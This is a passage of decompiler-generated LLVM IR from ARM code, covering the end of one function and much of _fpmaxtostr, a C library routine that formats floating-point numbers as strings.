  %v4_176ac = icmp eq i32 %v2_176ac, 0
  store i1 %v4_176ac, i1* %cpsr_z.global-to-local, align 1
  %v3_176b0 = inttoptr i32 %v1_176a4 to i8*
  store i8 %v0_176b0.off0, i8* %v3_176b0, align 1
  %v0_176b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_176b4, label %dec_label_pc_176b8, label %dec_label_pc_17604thread-pre-split

dec_label_pc_176b8:                               ; preds = %bb21
  %v2_176b8 = load i8, i8* %stack_var_-40, align 1
  %v2_176bc = icmp eq i8 %v2_176b8, 0
  store i1 %v2_176bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176bc, label %dec_label_pc_176b8..thread2_crit_edge, label %bb22

dec_label_pc_176b8..thread2_crit_edge:            ; preds = %dec_label_pc_176b8
  %v0_176c8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_176b8
  %v3_176c4 = load i32, i32* %r8.global-to-local, align 4
  %v4_176c4 = add i32 %v3_176c4, -1
  %v5_176c4 = inttoptr i32 %v4_176c4 to i8*
  store i8 45, i8* %v5_176c4, align 1
  %v6_176c4 = load i32, i32* %r8.global-to-local, align 4
  %v7_176c4 = add i32 %v6_176c4, -1
  store i32 %v7_176c4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_176b8..thread2_crit_edge, %bb22
  %v0_176c8 = phi i32 [ %v0_176c8.pre, %dec_label_pc_176b8..thread2_crit_edge ], [ %v7_176c4, %bb22 ]
  ret i32 %v0_176c8

; uselistorder directives
  uselistorder i32 %v0_17698, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17674, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_17690, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_175c8, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_176d4 = load i32, i32* @r4, align 4
  store i32 %v3_176d4, i32* %stack_var_-36, align 4
  %v6_176d4 = load i32, i32* @r5, align 4
  %v9_176d4 = load i32, i32* @r6, align 4
  %v12_176d4 = load i32, i32* @r7, align 4
  %v15_176d4 = load i32, i32* @r8, align 4
  %v18_176d4 = load i32, i32* @sb, align 4
  %v1_176dc = add i32 %tmp, 8
  %v2_176dc = inttoptr i32 %v1_176dc to i8*
  %v3_176dc = load i8, i8* %v2_176dc, align 1
  %v4_176dc = zext i8 %v3_176dc to i32
  store i32 %v4_176dc, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_176e4 = or i32 %v4_176dc, 32
  %v2_176e8 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_176ec = icmp ult i32 %v1_176e4, 97
  store i1 %v6_176ec, i1* %cpsr_n.global-to-local, align 1
  %v7_176ec = icmp eq i32 %v1_176e4, 97
  store i1 %v7_176ec, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_176f8 = load i32, i32* %arg4, align 4
  store i32 %v2_176f8, i32* %r8.global-to-local, align 4
  br i1 %v7_176ec, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_176fc = add nuw nsw i32 %v4_176dc, 6
  store i32 %v2_176fc, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_17710 = phi i32 [ 101, %entry ], [ %v2_176fc, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_17708 = add i32 %tmp, 12
  %v2_17708 = inttoptr i32 %v1_17708 to i32*
  %v3_17708 = load i32, i32* %v2_17708, align 4
  store i32 %v3_17708, i32* %r2.global-to-local, align 4
  %v1_1770c = add i32 %tmp, 4
  %v2_1770c = inttoptr i32 %v1_1770c to i32*
  %v3_1770c = load i32, i32* %v2_1770c, align 4
  store i32 %v3_1770c, i32* %r1.global-to-local, align 4
  br i1 %v7_176ec, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_17710 = urem i32 %v1_17710, 256
  store i32 %v2_17710, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17714 = icmp slt i32 %v2_176f8, 0
  store i1 %v1_17714, i1* %cpsr_n.global-to-local, align 1
  %v2_17714 = icmp eq i32 %v2_176f8, 0
  store i1 %v2_17714, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_17714, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_17720 = and i32 %v3_17708, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17720 = icmp eq i32 %v1_17720, 0
  store i1 %v2_17720, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_17720, label %dec_label_pc_17734, label %dec_label_pc_177a4

dec_label_pc_17734:                               ; preds = %bb184
  %v1_17734 = urem i32 %v3_17708, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17734 = icmp eq i32 %v1_17734, 0
  store i1 %v2_17734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17734, label %.thread10, label %dec_label_pc_177a4

dec_label_pc_177a4:                               ; preds = %dec_label_pc_17734, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_17734 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_177a8 = add i32 %tmp, 16
  %v3_177a8 = inttoptr i32 %v2_177a8 to i32*
  store i32 32, i32* %v3_177a8, align 4
  %v0_177b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_177b0 = add i32 %v0_177b0, -96
  %v3_177b0 = sub i32 95, %v0_177b0
  %v4_177b0 = and i32 %v3_177b0, %v0_177b0
  %v5_177b0 = icmp slt i32 %v4_177b0, 0
  store i1 %v5_177b0, i1* %cpsr_v.global-to-local, align 1
  %v6_177b0 = icmp slt i32 %v1_177b0, 0
  store i1 %v6_177b0, i1* %cpsr_n.global-to-local, align 1
  %v7_177b0 = icmp eq i32 %v0_177b0, 96
  store i1 %v7_177b0, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_177b0, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_177a4
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_177a4, %bb185
  %v4_177c8 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_177a4 ]
  %v4_177c8..v1_17758 = select i1 %tmp242, i32 %v4_177c8, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1dbb0.1090 to i32), i32* %r2.global-to-local, align 4
  %v2_177d4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_177d4, i32* %r6.global-to-local, align 4
  %v2_177d8 = add i32 %v4_177c8..v1_17758, ptrtoint ([4 x i8]* @global_var_1dbb0.1090 to i32)
  store i32 %v2_177d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c5c

.thread10:                                        ; preds = %dec_label_pc_17734
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_17860 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_17860, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17868

dec_label_pc_17868:                               ; preds = %dec_label_pc_178d8, %.thread10
  %v3_1787c = phi i32 [ %v2_178c8, %dec_label_pc_178d8 ], [ %v3_176d4, %.thread10 ]
  %v1_1787c = phi i1 [ %v5_178dc, %dec_label_pc_178d8 ], [ false, %.thread10 ]
  %v0_1787c = phi i1 [ %v6_178dc, %dec_label_pc_178d8 ], [ false, %.thread10 ]
  %v2_1787c = xor i1 %v1_1787c, %v0_1787c
  br i1 %v2_1787c, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_17868
  %v4_1787c = sub i32 0, %v3_1787c
  store i32 %v4_1787c, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_17868, %bb186
  %v0_17880 = phi i32 [ %v3_1787c, %dec_label_pc_17868 ], [ %v4_1787c, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17880 = icmp slt i32 %v0_17880, 0
  store i1 %v1_17880, i1* %cpsr_n.global-to-local, align 1
  %v2_17880 = icmp eq i32 %v0_17880, 0
  store i1 %v2_17880, i1* %cpsr_z.global-to-local, align 1
  %v0_1789c = load i32, i32* %sl.global-to-local, align 4
  %v1_1789c = add i32 %v0_1789c, 9
  store i32 %v1_1789c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_178a4

dec_label_pc_178a4:                               ; preds = %dec_label_pc_178a4.dec_label_pc_178a4_crit_edge, %bb187
  %v1_178b8 = phi i32 [ %v1_178b8.pre, %dec_label_pc_178a4.dec_label_pc_178a4_crit_edge ], [ %v1_1789c, %bb187 ]
  %v0_178b0 = phi i32 [ %v0_178cc, %dec_label_pc_178a4.dec_label_pc_178a4_crit_edge ], [ 0, %bb187 ]
  %v0_178bc = phi i32 [ %v2_178c8, %dec_label_pc_178a4.dec_label_pc_178a4_crit_edge ], [ %v0_17880, %bb187 ]
  %v2_178ac = urem i32 %v0_178bc, 10
  %v1_178b0 = add i32 %v0_178b0, 1
  store i32 %v1_178b0, i32* %r5.global-to-local, align 4
  %v1_178b4 = or i32 %v2_178ac, 48
  store i32 %v1_178b4, i32* %r2.global-to-local, align 4
  %v2_178b8 = sub i32 %v1_178b8, %v1_178b0
  store i32 %v2_178b8, i32* %r3.global-to-local, align 4
  store i32 %v0_178bc, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_178c4 = trunc i32 %v1_178b4 to i8
  %v3_178c4 = inttoptr i32 %v2_178b8 to i8*
  store i8 %v1_178c4, i8* %v3_178c4, align 1
  %v0_178c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_178c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_178c8 = udiv i32 %v0_178c8, %v1_178c8
  store i32 %v2_178c8, i32* %r0.global-to-local, align 4
  %v0_178cc = load i32, i32* %r5.global-to-local, align 4
  %v1_178cc = add i32 %v0_178cc, -8
  %v3_178cc = sub i32 7, %v0_178cc
  %v4_178cc = and i32 %v3_178cc, %v0_178cc
  %v5_178cc = icmp slt i32 %v4_178cc, 0
  store i1 %v5_178cc, i1* %cpsr_v.global-to-local, align 1
  %v6_178cc = icmp slt i32 %v1_178cc, 0
  store i1 %v6_178cc, i1* %cpsr_n.global-to-local, align 1
  %v7_178cc = icmp eq i32 %v0_178cc, 8
  store i1 %v7_178cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_178c8, i32* %r4.global-to-local, align 4
  %v7_178d4 = icmp slt i32 %v0_178cc, 9
  br i1 %v7_178d4, label %dec_label_pc_178a4.dec_label_pc_178a4_crit_edge, label %dec_label_pc_178d8

dec_label_pc_178a4.dec_label_pc_178a4_crit_edge:  ; preds = %dec_label_pc_178a4
  %v1_178b8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_178a4

dec_label_pc_178d8:                               ; preds = %dec_label_pc_178a4
  %v0_178d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_178d8 = add i32 %v0_178d8, 1
  store i32 %v1_178d8, i32* %r6.global-to-local, align 4
  %v3_178dc = sub i32 -1, %v0_178d8
  %v4_178dc = and i32 %v1_178d8, %v3_178dc
  %v5_178dc = icmp slt i32 %v4_178dc, 0
  store i1 %v5_178dc, i1* %cpsr_v.global-to-local, align 1
  %v6_178dc = icmp slt i32 %v0_178d8, 0
  store i1 %v6_178dc, i1* %cpsr_n.global-to-local, align 1
  %v7_178dc = icmp eq i32 %v0_178d8, 0
  store i1 %v7_178dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_178dc, label %dec_label_pc_17868, label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178d8
  %v0_178e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_178e4 = add i32 %v0_178e4, -96
  %v3_178e4 = sub i32 95, %v0_178e4
  %v4_178e4 = and i32 %v3_178e4, %v0_178e4
  %v5_178e4 = icmp slt i32 %v4_178e4, 0
  store i1 %v5_178e4, i1* %cpsr_v.global-to-local, align 1
  %v6_178e4 = icmp slt i32 %v1_178e4, 0
  store i1 %v6_178e4, i1* %cpsr_n.global-to-local, align 1
  %v7_178e4 = icmp eq i32 %v0_178e4, 96
  store i1 %v7_178e4, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_178e4, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_178e4
  %v5_178f0 = add i32 %v0_178e4, 32
  store i32 %v5_178f0, i32* %r3.global-to-local, align 4
  %v5_178f4 = urem i32 %v5_178f0, 256
  store i32 %v5_178f4, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_178e4, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_178e4 ]
  %v0_17914 = phi i32 [ %v5_178f4, %bb188 ], [ %v0_178e4, %dec_label_pc_178e4 ]
  %v7_178f8 = icmp eq i32 %v0_17914, 103
  %.229 = zext i1 %v7_178f8 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_17904 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17904 = icmp slt i32 %v0_17904, 0
  store i1 %v1_17904, i1* %cpsr_n.global-to-local, align 1
  %v2_17904 = icmp eq i32 %v0_17904, 0
  store i1 %v2_17904, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_17904, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1790c = icmp eq i1 %v7_178f8, false
  store i1 %v2_1790c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1790c, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_17910 = add i32 %v0_17904, -1
  store i32 %v2_17910, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_17920 = phi i32 [ %v0_17904, %.thread13 ], [ %v0_17904, %bb192 ], [ %v2_17910, %bb193 ]
  %v1_17914 = add i32 %v0_17914, -102
  %v3_17914 = sub i32 101, %v0_17914
  %v4_17914 = and i32 %v3_17914, %v0_17914
  %v5_17914 = icmp slt i32 %v4_17914, 0
  store i1 %v5_17914, i1* %cpsr_v.global-to-local, align 1
  %v6_17914 = icmp slt i32 %v1_17914, 0
  store i1 %v6_17914, i1* %cpsr_n.global-to-local, align 1
  %v7_17914 = icmp eq i32 %v0_17914, 102
  store i1 %v7_17914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17914, label %dec_label_pc_17920, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_17920, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17944

dec_label_pc_17920:                               ; preds = %bb194
  %v1_17920 = load i32, i32* %sb.global-to-local, align 4
  %v2_17920 = add i32 %v1_17920, %v0_17920
  store i32 %v2_17920, i32* %ip.global-to-local, align 4
  %v2_17924 = add i32 %v2_17920, 1
  %v4_17924 = sub i32 0, %v2_17920
  %v5_17924 = and i32 %v2_17924, %v4_17924
  %v6_17924 = icmp slt i32 %v5_17924, 0
  store i1 %v6_17924, i1* %cpsr_v.global-to-local, align 1
  %v7_17924 = icmp slt i32 %v2_17924, 0
  store i1 %v7_17924, i1* %cpsr_n.global-to-local, align 1
  %v8_17924 = icmp eq i32 %v2_17924, 0
  store i1 %v8_17924, i1* %cpsr_z.global-to-local, align 1
  %v6_17928 = icmp slt i32 %v2_17920, -1
  br i1 %v6_17928, label %dec_label_pc_1792c, label %dec_label_pc_17944

dec_label_pc_1792c:                               ; preds = %dec_label_pc_17920
  %v2_1792c = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_1792c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_17938 = bitcast i32* %stack_var_-87 to i8*
  %v3_17938 = call i32 @__GI_memset(i8* %v2_17938, i32 48)
  store i32 %v3_17938, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_17920, %bb195, %dec_label_pc_1792c
  %v1_1798869 = phi i32 [ %v2_178c8, %bb195 ], [ %v3_17938, %dec_label_pc_1792c ], [ %v2_178c8, %dec_label_pc_17920 ]
  %v1_1796c = phi i32 [ %v0_17920, %bb195 ], [ -1, %dec_label_pc_1792c ], [ %v2_17920, %dec_label_pc_17920 ]
  %v1_17948 = add i32 %v1_1796c, -16
  %v3_17948 = sub i32 15, %v1_1796c
  %v4_17948 = and i32 %v3_17948, %v1_1796c
  %v5_17948 = icmp slt i32 %v4_17948, 0
  store i1 %v5_17948, i1* %cpsr_v.global-to-local, align 1
  %v6_17948 = icmp slt i32 %v1_17948, 0
  store i1 %v6_17948, i1* %cpsr_n.global-to-local, align 1
  %v7_17948 = icmp eq i32 %v1_1796c, 16
  store i1 %v7_17948, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_17954 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_17954, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_1795c = icmp sgt i32 %v1_1796c, 16
  br i1 %v7_1795c, label %.thread18, label %dec_label_pc_17968

.thread18:                                        ; preds = %dec_label_pc_17944
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_17960 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_17960, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_17968:                               ; preds = %dec_label_pc_17944
  %v2_17968 = ptrtoint i32* %stack_var_-86 to i32
  %v2_1796c = add i32 %v1_1796c, %v2_17968
  store i32 %v2_1796c, i32* %r3.global-to-local, align 4
  %v1_17970 = add i32 %v2_1796c, 2
  %v2_17970 = inttoptr i32 %v1_17970 to i8*
  %v3_17970 = load i8, i8* %v2_17970, align 1
  %v4_17970 = zext i8 %v3_17970 to i32
  store i32 %v4_17970, i32* %r2.global-to-local, align 4
  store i32 %v1_17970, i32* %r1.global-to-local, align 4
  %v2_17978 = icmp ugt i8 %v3_17970, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17978 = icmp ult i8 %v3_17970, 52
  store i1 %v6_17978, i1* %cpsr_n.global-to-local, align 1
  %v7_17978 = icmp eq i8 %v3_17970, 52
  store i1 %v7_17978, i1* %cpsr_z.global-to-local, align 1
  %v2_1797c = xor i1 %v2_17978, true
  %v3_1797c = or i1 %v7_17978, %v2_1797c
  br i1 %v3_1797c, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_17968
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_17968, %bb196
  %v1_1798868 = phi i32 [ %v1_1798869, %dec_label_pc_17968 ], [ 0, %bb196 ]
  %v2_17980 = xor i1 %v7_17978, true
  %v3_17980 = and i1 %v2_17978, %v2_17980
  br i1 %v3_17980, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_17988 = phi i32 [ %v1_17988.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1798868, %bb197 ], [ 1, %bb198 ]
  %v0_17984 = phi i32 [ %v0_17990, %.backedge ], [ %v10_17960, %.thread18 ], [ %v1_17970, %bb197 ], [ %v1_17970, %bb198 ]
  %v1_17984 = add i32 %v0_17984, -1
  %v2_17984 = inttoptr i32 %v1_17984 to i8*
  %v3_17984 = load i8, i8* %v2_17984, align 1
  %v4_17984 = zext i8 %v3_17984 to i32
  store i32 %v1_17984, i32* %r1.global-to-local, align 4
  %v2_17988 = add i32 %v4_17984, %v1_17988
  store i32 %v2_17988, i32* %r3.global-to-local, align 4
  %v1_1798c = trunc i32 %v2_17988 to i8
  store i8 %v1_1798c, i8* %v2_17984, align 1
  %v0_17990 = load i32, i32* %r1.global-to-local, align 4
  %v1_17990 = inttoptr i32 %v0_17990 to i8*
  %v2_17990 = load i8, i8* %v1_17990, align 1
  %v3_17990 = zext i8 %v2_17990 to i32
  store i32 %v3_17990, i32* %r2.global-to-local, align 4
  %v2_17994 = icmp ugt i8 %v2_17990, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17994 = icmp ult i8 %v2_17990, 57
  store i1 %v6_17994, i1* %cpsr_n.global-to-local, align 1
  %v7_17994 = icmp eq i8 %v2_17990, 57
  store i1 %v7_17994, i1* %cpsr_z.global-to-local, align 1
  %v2_17998 = xor i1 %v2_17994, true
  %v3_17998 = or i1 %v7_17994, %v2_17998
  br i1 %v3_17998, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_1799c = xor i1 %v7_17994, true
  %v3_1799c = and i1 %v2_17994, %v2_1799c
  br i1 %v3_1799c, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_179a4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_179a4 = phi i32 [ %v1_179a4.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_179a0 = icmp ult i8 %v2_17990, 48
  store i1 %v6_179a0, i1* %cpsr_n.global-to-local, align 1
  %v7_179a0 = icmp eq i8 %v2_17990, 48
  store i1 %v7_179a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_179a0, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_179a4 = or i32 %v1_179a4, 1
  store i32 %v2_179a4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_179a821 = icmp slt i32 %v2_179a4, 0
  store i1 %v1_179a821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_179a8 = icmp slt i32 %v1_179a4, 0
  store i1 %v1_179a8, i1* %cpsr_n.global-to-local, align 1
  %v2_179a8 = icmp eq i32 %v1_179a4, 0
  store i1 %v2_179a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179a8, label %dec_label_pc_179b0, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_17988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_179b0:                               ; preds = %bb203
  store i32 %v2_17954, i32* %r2.global-to-local, align 4
  %v2_179b4 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_179b4, i32* %r3.global-to-local, align 4
  %v2_179b8 = sub i32 %v0_17990, %v2_179b4
  %v3_179b8 = icmp uge i32 %v0_17990, %v2_179b4
  %v4_179b8 = xor i32 %v0_17990, %v2_179b4
  %v5_179b8 = xor i32 %v2_179b8, %v0_17990
  %v6_179b8 = and i32 %v5_179b8, %v4_179b8
  %v7_179b8 = icmp slt i32 %v6_179b8, 0
  store i1 %v7_179b8, i1* %cpsr_v.global-to-local, align 1
  %v8_179b8 = icmp slt i32 %v2_179b8, 0
  store i1 %v8_179b8, i1* %cpsr_n.global-to-local, align 1
  %v9_179b8 = icmp eq i32 %v0_17990, %v2_179b4
  store i1 %v9_179b8, i1* %cpsr_z.global-to-local, align 1
  %v2_179bc = xor i1 %v3_179b8, true
  %v3_179bc = or i1 %v9_179b8, %v2_179bc
  br i1 %v3_179bc, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_179b0
  store i32 %v2_179b4, i32* %r2.global-to-local, align 4
  store i32 %v2_179b4, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_179b0, %bb204
  %v2_179d8 = phi i32 [ %v2_179b4, %bb204 ], [ %v0_17990, %dec_label_pc_179b0 ]
  %v4_179c8123 = phi i32 [ %v2_179b4, %bb204 ], [ %v2_17954, %dec_label_pc_179b0 ]
  %v2_179c4 = xor i1 %v9_179b8, true
  %v3_179c4 = and i1 %v3_179b8, %v2_179c4
  br i1 %v3_179c4, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_179c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_179c4, i32* %r0.global-to-local, align 4
  %v5_179c8 = add i32 %v4_179c8123, 2
  store i32 %v5_179c8, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_179bc, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_179cc = load i32, i32* %sb.global-to-local, align 4
  %v5_179cc = add i32 %v4_179cc, 1
  store i32 %v5_179cc, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_179d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_179d4 = add i32 %v0_179d4, -103
  %v3_179d4 = sub i32 102, %v0_179d4
  %v4_179d4 = and i32 %v3_179d4, %v0_179d4
  %v5_179d4 = icmp slt i32 %v4_179d4, 0
  store i1 %v5_179d4, i1* %cpsr_v.global-to-local, align 1
  %v6_179d4 = icmp slt i32 %v1_179d4, 0
  store i1 %v6_179d4, i1* %cpsr_n.global-to-local, align 1
  %v7_179d4 = icmp eq i32 %v0_179d4, 103
  store i1 %v7_179d4, i1* %cpsr_z.global-to-local, align 1
  %v3_179d8 = add i32 %v2_179d8, 1
  %v4_179d8 = inttoptr i32 %v3_179d8 to i8*
  store i8 0, i8* %v4_179d8, align 1
  %v0_179dc = load i32, i32* %r1.global-to-local, align 4
